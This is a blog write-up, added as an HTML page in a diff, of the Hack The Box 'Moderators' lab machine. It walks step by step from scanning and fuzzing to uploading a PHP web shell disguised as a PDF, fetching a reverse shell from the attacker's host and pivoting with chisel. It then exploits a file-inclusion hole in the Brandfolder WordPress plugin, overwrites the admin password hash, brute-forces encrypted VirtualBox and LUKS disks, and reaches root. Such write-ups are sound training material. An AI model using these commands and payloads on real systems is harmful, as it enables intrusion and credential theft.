@@ -1,0 +1,378 @@
+<!doctype html>
+<html lang="en-us">
+  <head>
+    <title>HTB - Moderators [Hard] // meowmeowattack</title>
+    <link rel="shortcut icon" href="/favicon.ico" />
+    <meta charset="utf-8" />
+    <meta name="generator" content="Hugo 0.105.0">
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <meta name="author" content="meowmeowattack" />
+    <meta name="description" content="" />
+    <link rel="stylesheet" href="https://meowmeowattack.github.io/css/main.min.0fb49e70a30412f97ddfc418e18fefef1d9fcdebe45f634dbbba768b00fe1eec.css" />
+
+    
+    <meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="HTB - Moderators [Hard]"/>
+<meta name="twitter:description" content="Scanning &gt; TARGET=10.129.129.9 &amp;&amp; nmap -p$(nmap -p- --min-rate=1000 -T4 $TARGET -Pn | grep ^[0-9] | cut -d &#39;/&#39; -f 1 | tr &#39;\n&#39; &#39;,&#39; | sed s/,$//) -sC -sV -Pn -vvv $TARGET -oN nmap_tcp_all.nmapPORT STATE SERVICE REASON VERSION22/tcp open ssh syn-ack ttl 63 OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)80/tcp open http syn-ack ttl 63 Apache httpd 2.4.41 ((Ubuntu))|_http-title: Moderators| http-methods: |_ Supported Methods: GET HEAD POST OPTIONS|_http-server-header: Apache/2."/>
+
+    <meta property="og:title" content="HTB - Moderators [Hard]" />
+<meta property="og:description" content="Scanning &gt; TARGET=10.129.129.9 &amp;&amp; nmap -p$(nmap -p- --min-rate=1000 -T4 $TARGET -Pn | grep ^[0-9] | cut -d &#39;/&#39; -f 1 | tr &#39;\n&#39; &#39;,&#39; | sed s/,$//) -sC -sV -Pn -vvv $TARGET -oN nmap_tcp_all.nmapPORT STATE SERVICE REASON VERSION22/tcp open ssh syn-ack ttl 63 OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)80/tcp open http syn-ack ttl 63 Apache httpd 2.4.41 ((Ubuntu))|_http-title: Moderators| http-methods: |_ Supported Methods: GET HEAD POST OPTIONS|_http-server-header: Apache/2." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://meowmeowattack.github.io/htb/moderators/" /><meta property="article:section" content="htb" />
+<meta property="article:published_time" content="2022-08-07T23:18:05+13:00" />
+<meta property="article:modified_time" content="2022-08-07T23:18:05+13:00" />
+
+
+
+  </head>
+  <body>
+    <header class="app-header">
+      <a href="https://meowmeowattack.github.io/"><img class="app-header-avatar" src="/avatar.jpg" alt="meowmeowattack" /></a>
+      <span class="app-header-title">meowmeowattack</span>
+      <nav class="app-header-menu">
+          <a class="app-header-menu-item" href="/">/meow</a>
+             - 
+          
+          <a class="app-header-menu-item" href="/htb/">/htb</a>
+             - 
+          
+          <a class="app-header-menu-item" href="/notes/">/notes</a>
+      </nav>
+      <p>the meow of pentest</p>
+    </header>
+    <main class="app-container">
+      
+  <article class="post">
+    <header class="post-header">
+      <h1 class ="post-title">HTB - Moderators [Hard]</h1>
+      <div class="post-meta">
+        <div>
+          <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-calendar">
+  <title>calendar</title>
+  <rect x="3" y="4" width="18" height="18" rx="2" ry="2"></rect><line x1="16" y1="2" x2="16" y2="6"></line><line x1="8" y1="2" x2="8" y2="6"></line><line x1="3" y1="10" x2="21" y2="10"></line>
+</svg>
+          Aug 7, 2022
+        </div>
+        <div>
+          <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-clock">
+  <title>clock</title>
+  <circle cx="12" cy="12" r="10"></circle><polyline points="12 6 12 12 16 14"></polyline>
+</svg>
+          7 min read
+        </div>
+      </div>
+    </header>
+    <div class="post-content">
+      <h1 id="scanning">Scanning</h1>
+<pre tabindex="0"><code>&gt; TARGET=10.129.129.9 &amp;&amp; nmap -p$(nmap -p- --min-rate=1000 -T4 $TARGET -Pn | grep ^[0-9] | cut -d &#39;/&#39; -f 1 | tr &#39;\n&#39; &#39;,&#39; | sed s/,$//) -sC -sV -Pn -vvv $TARGET -oN nmap_tcp_all.nmap
+
+PORT   STATE SERVICE REASON         VERSION
+22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
+80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.41 ((Ubuntu))
+|_http-title: Moderators
+| http-methods: 
+|_  Supported Methods: GET HEAD POST OPTIONS
+|_http-server-header: Apache/2.4.41 (Ubuntu)s
+</code></pre><h1 id="cors-scan">cors scan</h1>
+<pre tabindex="0"><code>&gt; corscanner -v -u http://10.129.129.9/
+&gt; echo http://10.129.129.9/ | ~/go/bin/ucors
+</code></pre><h1 id="dirsearch">dirsearch</h1>
+<pre tabindex="0"><code>&gt; dirsearch -u http://10.129.129.9/ -x 401,302,403
+[19:24:05] 200 -   11KB - /about.php                                        
+[19:24:47] 200 -   10KB - /contact.php                                      
+[19:24:49] 301 -  310B  - /css  -&gt;  http://10.129.129.9/css/                
+[19:25:07] 301 -  313B  - /images  -&gt;  http://10.129.129.9/images/          
+[19:25:07] 200 -    0B  - /images/                                          
+[19:25:08] 200 -   11KB - /index.php                                        
+[19:25:08] 200 -   11KB - /index.php/login/                                 
+[19:25:17] 301 -  311B  - /logs  -&gt;  http://10.129.129.9/logs/              
+[19:25:17] 200 -    0B  - /logs/
+</code></pre><h1 id="fuzzing-report">fuzzing report</h1>
+<ul>
+<li>By fuzzing report ids, i found multiple reports</li>
+</ul>
+<pre tabindex="0"><code>&gt; wfuzz -c -z range,0-9999 -u &#34;http://10.129.129.9/reports.php?report=FUZZ&#34; --hh 7888
+</code></pre><ul>
+<li>Found several interesting entries</li>
+</ul>
+<pre tabindex="0"><code>* http://10.129.129.9/reports.php?report=2589
+* http://10.129.129.9/reports.php?report=3478
+* http://10.129.129.9/reports.php?report=4221
+* http://10.129.129.9/reports.php?report=7612
+* http://10.129.129.9/reports.php?report=8121
+</code></pre><ul>
+<li>one of them shows an intersting path, this is the md5sum of the report id</li>
+</ul>
+<pre tabindex="0"><code>* http://10.129.129.9/reports.php?report=9798
+[+] Domain : bethebest101.uk.htb
+[+] Vulnerability : Sensitive Information Disclosure
+[+] Impact : 3.5/4.0
+[+] Disclosed by : Karlos Young
+[+] Disclosed on : 11/19/2021
+[+] Posted on :
+[+] Approved :
+[+] Patched : NO
+[+] LOGS : logs/e21cece511f43a5cb18d4932429915ed/ 
+
+e21cece511f43a5cb18d4932429915ed is md5(9798)
+&gt; echo -n 9798 | md5sum
+</code></pre><ul>
+<li>Then, we can use this methdo to find the other valid paths</li>
+</ul>
+<pre tabindex="0"><code>&gt; wfuzz -c -z range,0-9999,md5 -u &#34;http://10.129.129.9/logs/FUZZ/&#34; --hh 274
+000002590:   200        0 L      0 W        0 Ch        &#34;743c41a921516b04afde48bb48e28ce6&#34;
+000003479:   200        0 L      0 W        0 Ch        &#34;b071cfa81605a94ad80cfa2bbc747448&#34;
+000004222:   200        0 L      0 W        0 Ch        &#34;74d90aafda34e6060f9e8433962d14fd&#34;
+000007613:   200        0 L      0 W        0 Ch        &#34;ce5d75028d92047a9ec617acb9c34ce6&#34;
+000008122:   200        0 L      0 W        0 Ch        &#34;afecc60f82be41c1b52f6705ec69e0f1&#34;
+000009799:   200        0 L      0 W        0 Ch        &#34;e21cece511f43a5cb18d4932429915ed&#34;
+</code></pre><ul>
+<li>continue path discovery found other usefull folders and files</li>
+</ul>
+<pre tabindex="0"><code>&gt; dirsearch -u http://10.129.129.9/logs/ -x 404,401,403
+[19:44:26] 301 -  315B  - /logs/css  -&gt;  http://10.129.129.9/logs/css/      
+[19:44:45] 200 -    0B  - /logs/index.html                                  
+[19:45:37] 301 -  319B  - /logs/uploads  -&gt;  http://10.129.129.9/logs/uploads/
+[19:45:37] 200 -    0B  - /logs/uploads/
+</code></pre><ul>
+<li>two files are downloadable, from where we found a new path /logs/report_log_upload.php</li>
+</ul>
+<pre tabindex="0"><code>&gt; curl -i http://10.129.129.9/logs/ce5d75028d92047a9ec617acb9c34ce6/logs.pdf --output logs.pdf
+[06/01/2021] Log file created for report #7612.
+[06/01/2021] Report submitted by Shivankar Rumar.
+[06/03/2021] Report accepted.
+[06/03/2021] LOG file uploaded from /logs/report_log_upload.php
+[06/04/2021] Reported to the site administrators.
+[06/10/2021] Posting approval sent to the owners.
+[06/12/2021] Approval pending......
+&gt; curl -i http://10.129.129.9/logs/743c41a921516b04afde48bb48e28ce6/logs.pdf --output logs.pdf
+[01/30/2021] Log file created for report #2589.
+[01/30/2021] Report submitted by Sharaf Ahamed.
+[02/03/2021] Report accepted.
+[02/03/2021] LOG file uploaded from /logs/report_log_upload.php
+[02/04/2021] Reported to the site administrators.
+[02/05/2021] Posting approval sent to the owners.
+[02/07/2021] Approval pending......
+</code></pre><h1 id="upload-shell">upload shell</h1>
+<ul>
+<li>We can upload pdf files through this form. however, initially, it failed even though i uploaded a valid pdf file.</li>
+<li>later i found that you need to change ensure the content-type is application/pdf and as long as you keep the pdf header as shown below, the file can be uploaded sucessfully.</li>
+<li>http://10.129.129.9/logs/report_log_upload.php</li>
+</ul>
+<pre tabindex="0"><code>%PDF-1.5
+&lt;?php echo system(&#39;ls&#39;); ?&gt;
+%%EOF
+</code></pre><ul>
+<li>
+<p>http://10.129.129.9/logs/uploads/logs.pdf.php</p>
+</li>
+<li>
+<p>There appears to be a filter that disables multiple functions, there is a good tool that can bypass this.</p>
+</li>
+<li>
+<p><a href="https://github.com/epinna/weevely3">https://github.com/epinna/weevely3</a></p>
+</li>
+<li>
+<p>To use, start by generating a shell agent</p>
+</li>
+</ul>
+<pre tabindex="0"><code>&gt; python3 weevely.py generate meow meow.pdf.php
+</code></pre><ul>
+<li>upload the shell agent to the target</li>
+<li>Then, connect to the agent</li>
+</ul>
+<pre tabindex="0"><code>&gt; python3 weevely.py &#39;http://10.129.129.9/logs/uploads/meow.pdf.php&#39; meow
+</code></pre><ul>
+<li>Now, you should be able to issue cmd on the target, but i uploaded a better reverse shell as weevely agent is too slow</li>
+</ul>
+<pre tabindex="0"><code>&gt; cp /usr/share/webshells/php/php-reverse-shell.php w.php
+weevely&gt; wget http://10.10.16.11/w.php
+</code></pre><ul>
+<li>receive the reverse connection</li>
+</ul>
+<pre tabindex="0"><code>&gt; python3 -c &#39;import pty; pty.spawn(&#34;/bin/bash&#34;)&#39;
+</code></pre><h1 id="pe-to-lexi">PE to lexi</h1>
+<ul>
+<li>Enum found a script running as the user lexi</li>
+</ul>
+<pre tabindex="0"><code>root         827  0.0  0.0   8368  3764 ?        Ss   Aug04   0:00 /usr/sbin/runuser -u lexi /usr/local/sbin/startup.sh
+lexi         861  0.0  0.0   2608   532 ?        S    Aug04   0:00  _ /bin/sh /usr/local/sbin/startup.sh
+lexi         865  0.0  0.7 228360 31616 ?        S    Aug04   0:14      _ /usr/bin/php -S 127.0.0.1:8080 -t /opt/site.new/
+</code></pre><ul>
+<li>The site is run at a local port 8080</li>
+</ul>
+<pre tabindex="0"><code>[+] Active Ports
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#open-ports
+tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -
+tcp        0      0 127.0.0.1:8080          0.0.0.0:*               LISTEN      -
+tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -
+tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -
+tcp6       0      0 :::80                   :::*                    LISTEN      -
+tcp6       0      0 :::22                   :::*                    LISTEN      -
+</code></pre><ul>
+<li>There is a new site (WP) running on 127.0.0.1:8080, in order to access the site, need to pivot the traffic</li>
+<li>upload chisel to the target</li>
+</ul>
+<pre tabindex="0"><code>&gt; chisel server -p 8888 --reverse
+&gt; /tmp/chisel client 10.10.16.11:8888 R:8080:localhost:8080
+</code></pre><ul>
+<li>
+<p>We can found explore the site at <a href="http://moderators.htb:8080">http://moderators.htb:8080</a></p>
+</li>
+<li>
+<p>With some enum of the site at /opt/site.new/wp-content/plugins, it leads me to a public exploit against brandfolder</p>
+</li>
+<li>
+<p><a href="https://www.exploit-db.com/exploits/39591">https://www.exploit-db.com/exploits/39591</a></p>
+</li>
+<li>
+<p>examine the callback.php file, this exploit should work.</p>
+</li>
+</ul>
+<pre tabindex="0"><code>&gt; cat /opt/site.new/wp-content/plugins/brandfolder/callback.php
+
+&lt;?php
+  ini_set(&#39;display_errors&#39;,1);
+  ini_set(&#39;display_startup_errors&#39;,1);
+  error_reporting(0);
+
+  require_once($_REQUEST[&#39;wp_abspath&#39;]  . &#39;wp-load.php&#39;);
+  require_once($_REQUEST[&#39;wp_abspath&#39;]  . &#39;wp-admin/includes/media.php&#39;);
+  require_once($_REQUEST[&#39;wp_abspath&#39;]  . &#39;wp-admin/includes/file.php&#39;);
+  require_once($_REQUEST[&#39;wp_abspath&#39;]  . &#39;wp-admin/includes/image.php&#39;);
+  require_once($_REQUEST[&#39;wp_abspath&#39;]  . &#39;wp-admin/includes/post.php&#39;);
+</code></pre><ul>
+<li>For some reason, creating the directory under /tmp doesn&rsquo;t work. But /var/www/html/logs/uploads/wp works</li>
+</ul>
+<pre tabindex="0"><code>&gt; mkdir -p /var/www/html/logs/uploads/wp-admin/includes
+echo &#39;&lt;?php ?&gt;&#39; &gt; wp-admin/includes/media.php
+echo &#39;&lt;?php ?&gt;&#39; &gt; wp-admin/includes/file.php
+echo &#39;&lt;?php ?&gt;&#39; &gt; wp-admin/includes/image.php
+echo &#39;&lt;?php ?&gt;&#39; &gt; wp-admin/includes/post.php
+&gt; cp /var/www/html/logs/uploads/w.php /var/www/html/logs/uploads/wp/wp-load.php
+</code></pre><ul>
+<li>browse to <a href="http://moderators.htb:8080/wp-content/plugins/brandfolder/callback.php?wp_abspath=/var/www/html/logs/uploads/wp/">http://moderators.htb:8080/wp-content/plugins/brandfolder/callback.php?wp_abspath=/var/www/html/logs/uploads/wp/</a> and receive the reverse shell.</li>
+<li>Grab lexi&rsquo;s id_rsa and get the user flag</li>
+</ul>
+<h1 id="pe">pe</h1>
+<ul>
+<li>Examine the wp-config.php under /opt/site.new for db credential</li>
+</ul>
+<pre tabindex="0"><code>&gt; cat /opt/site.new/wp-config.php
+define( &#39;DB_NAME&#39;, &#39;wordpress&#39; );
+define( &#39;DB_USER&#39;, &#39;wordpressuser&#39; );
+define( &#39;DB_PASSWORD&#39;, &#39;wordpresspassword123!!&#39; );
+define( &#39;DB_HOST&#39;, &#39;localhost&#39; );
+</code></pre><h1 id="hijack-wp-admin">hijack wp admin</h1>
+<ul>
+<li>login to the db and found the admin user in wp_users, don&rsquo;t attempt to crack the password, replace it instead.</li>
+</ul>
+<pre tabindex="0"><code>&gt; mysql -h localhost -u wordpressuser -D wordpress -p&#39;wordpresspassword123!!&#39;
+MariaDB [wordpress]&gt; select * from wp_users;
+admin      | $P$BXasOiM52pOUIRntJTPVlMoH0ZlntT0
+&gt; UPDATE `wp_users` SET `user_pass`=&#39;$P$BNMdSXZIJVPFih/nCL/Tm6eT152wQv0&#39; WHERE user_login=&#39;admin&#39;;
+</code></pre><ul>
+<li>You can pivot more easily using ssh now (if you prefer)</li>
+</ul>
+<pre tabindex="0"><code>&gt; ssh -L 8080:localhost:8080 -i lexi.id_rsa lexi@10.129.129.9
+</code></pre><h1 id="pe-john">PE: john</h1>
+<ul>
+<li>login to wp admin and check the password manager plugin: <a href="http://moderators.htb:8080/wp-admin/admin.php?page=pms_menu">http://moderators.htb:8080/wp-admin/admin.php?page=pms_menu</a></li>
+<li>Now, since we have john&rsquo;s ssh key, we can login as john
+<code>carl@moderators.htb:Carl@thebest**</code></li>
+</ul>
+<h1 id="vdi-cracking">vdi cracking</h1>
+<ul>
+<li>In /home/john, there is a ~/stuff/VBOX folder where we can find a vbox backup</li>
+<li>Donwload both files and crack the password</li>
+</ul>
+<pre tabindex="0"><code>&gt; python3 ~/tools/pyvboxdie-cracker/pyvboxdie-cracker.py -v 2019-08-01.vbox -d ~/tools/pyvboxdie-cracker/wordlist.txt 
+Starting pyvboxdie-cracker...
+
+[*] Encrypted drive found :  F:/2019.vdi
+[*] KeyStore information...
+        Algorithm = AES-XTS256-PLAIN64
+        Hash = PBKDF2-SHA256
+        Final Hash = 5442057bc804a3a914607decea5574aa7038cdce0d498c7fc434afe8cd5b244f
+
+[*] Starting bruteforce...
+        2 password tested...
+        50 password tested...
+        62 password tested...
+
+[*] Password Found = computer
+
+&gt; python3 virtualbox2hashcat.py --vbox 2019-08-01.vbox            
+$vbox$0$540000$546291a6074943b096ea80db2ae39d4179de6d1c3f17ea25d62e627abfa7fbcb$16$a386a5432e938f20c8fbc9af460a78c1790c19abd1c51e9c0be724939c9481586180fc4a34135d8481e436d8c132b8f4b9a550de4b248300ba32b18b645865d6$20000$e9608bcdd8c070868859a31c9f1e5e5de98b5ead8c21f25c0c43ee697816e32c$5442057bc804a3a914607decea5574aa7038cdce0d498c7fc434afe8cd5b244f
+</code></pre><ul>
+<li>install virtualbox on windows</li>
+<li>move 2019.vdi and 2019-08-01.vbox to a folder</li>
+<li>update 2019-08-01.vbox with correct path</li>
+<li>double click 2019-08-01.vbox to import the vm</li>
+<li>open the vm setting</li>
+<li>In harddisk, remove Ubuntu</li>
+<li>in the 2019-08-01.vbox file, remove</li>
+</ul>
+<pre tabindex="0"><code>&lt;HardDisk uuid=&#34;{5999a8f0-e31d-4d4e-937d-173eb6ba8881}&#34; location=&#34;Ubuntu.vdi&#34; format=&#34;VDI&#34; type=&#34;Normal&#34;/&gt;
+</code></pre><ul>
+<li>
+<p>In disk encryption, un-tick enryption and enter the password <code>computer</code></p>
+</li>
+<li>
+<p>now we should have a decrypted disk 2019.vdi</p>
+</li>
+<li>
+<p>Download a unbuntu iso and use the iso to boot up</p>
+</li>
+<li>
+<p>In the boot up screen, we can select to try ubuntu</p>
+</li>
+<li>
+<p>You will find the 2019.vdi disk is still encrypted. Trying to mount it will show error of unknown type luks</p>
+</li>
+</ul>
+<pre tabindex="0"><code>&gt; sudo mount /dev/sda /tmp
+mount: /tmp: unknown filesystem type &#39;crypto_LUKS&#39;
+</code></pre><ul>
+<li>Use this tool to crack it: <a href="https://github.com/Diverto/cryptsetup-pwguess/releases/tag/v1.0.0">https://github.com/Diverto/cryptsetup-pwguess/releases/tag/v1.0.0</a>, <code>bruteforce-luks-static-linux-amd64</code></li>
+<li>Use the same wordlist from pyvboxdie-cracker</li>
+</ul>
+<pre tabindex="0"><code>&gt; sudo ./bruteforce-luks-static-linux-amd64 -f wordlist.txt /dev/sda
+</code></pre><ul>
+<li>
+<p>The password is <code>abc123</code></p>
+</li>
+<li>
+<p>mount the 2019.vdi disk open it with the password <code>abc123</code></p>
+</li>
+<li>
+<p>in the scripts/all-in-one/distro_update.sh file, there is the password for john</p>
+</li>
+</ul>
+<h1 id="pe-john---root">PE: john -&gt; root</h1>
+<ul>
+<li>john&rsquo;s password: <code>$_THE_best_Sysadmin_Ever_</code></li>
+</ul>
+<pre tabindex="0"><code>john@moderators:~/stuff/VBOX$ sudo -l
+[sudo] password for john: 
+Matching Defaults entries for john on moderators:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User john may run the following commands on moderators:
+    (root) ALL
+
+john@moderators:~/stuff/VBOX$ sudo su
+root@moderators:/home/john/stuff/VBOX# id
+uid=0(root) gid=0(root) groups=0(root)
+root@moderators:/home/john/stuff/VBOX# cat /root/root.txt 
+bcf0fec9b0aaf3afe31c19782c71897b
+</code></pre>
+    </div>
+    <div class="post-footer">
+      
+    </div>
+  </article>
+
+    </main>
+  </body>
+</html>
